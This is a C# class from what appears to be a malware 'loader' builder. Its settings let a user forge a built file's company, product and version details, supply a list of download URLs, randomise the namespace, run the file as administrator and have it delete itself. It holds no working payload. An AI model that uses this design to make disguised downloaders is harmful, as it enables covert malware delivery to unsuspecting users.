namespace GameOverLoaderBuilder
{
    using System.Windows.Forms;

    public class Build
    {
        #region String properties 

        public string BoxIcon { get; set; } // Иконка для билд файла
        public string BoxFileName { get; set; } // Имя билд файла
        public string AssTitle { get; set; } // Заголовок
        public string AssDescription { get; set; } // Дескриптор
        public string AssCompany { get; set; } // Имя компании
        public string AssProduct { get; set; } // Имя продукта
        public string AssCopyright { get; set; } // Копирайт
        public string AssVersion { get; set; } // Версия
        public string AssFileVersion { get; set; } // Версия файла
        public string GuidBox { get; set; } // GUID
        public string ComboPath { get; set; } // Путь сохранения ссылок
        public string ListBoxUrl { get; set; } // ListBox куда добавляем сссылки с формы
        public string RandomNameSpace { get; set; } // Рандомный текст namespace

        #endregion

        #region Controls properties

        public Label LMessage { get; set; }
        public NumericUpDown NUp { get; set; }

        #endregion

        #region Boolean properties

        public bool Runadmin { get; set; } 
        public bool Suicide { get; set; }

        #endregion
    }
}